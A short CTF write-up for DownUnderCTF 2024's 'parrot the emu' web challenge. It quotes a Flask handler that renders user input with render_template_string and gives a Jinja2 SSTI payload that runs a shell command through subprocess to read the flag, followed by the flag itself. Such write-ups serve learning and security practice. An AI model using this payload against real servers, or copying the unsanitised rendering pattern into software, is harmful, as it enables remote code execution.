---
title: "parrot the emu - DownUnderCTF 2024"
category: "web"
subcategory: "ssti"
type: "writeup"
tags: ["web", "beginner", "ssti", "render-template", "parrot", "emu", "downunderctf", "downunderctf-2024", "2024", "ctf-writeup"]
summary: "This challenge presents an SSTI (Server Side Template Injection)."
source:
  name: "CTFtime writeup #39313"
  url: "https://ctftime.org/writeup/39313"
ctf:
  name: "DownUnderCTF 2024"
  year: 2024
  challenge: "parrot the emu"
---

## Metadata

- **CTF:** DownUnderCTF 2024
- **Task:** parrot the emu
- **Author team:** aetruria
- **CTFtime tags:** web, beginner
- **CTFtime:** <https://ctftime.org/writeup/39313>

---
This challenge presents an SSTI (Server Side Template Injection). In fact, upon examining the server's source code ([app.py](http://app.py)), we can observe the following snippet:

```python  
if request.method == 'POST':  
user_input = request.form.get('user_input')  
try:  
result = render_template_string(user_input)  
except Exception as e:  
result = str(e)  
```

The code takes user_input without applying any sanitization and directly renders it. This vulnerability allows us to inject a malicious template, such as:

```python  
{{ ''.__class__.__mro__[1].__subclasses__()[213]('/usr/bin/cat flag', shell=True, stdout=-1).communicate() }}  
```

the aftermentioned template allows us to print the output of the flag file, which contains the challenge flag:

#### DUCTF{PaRrOt_EmU_ReNdErS_AnYtHiNg}
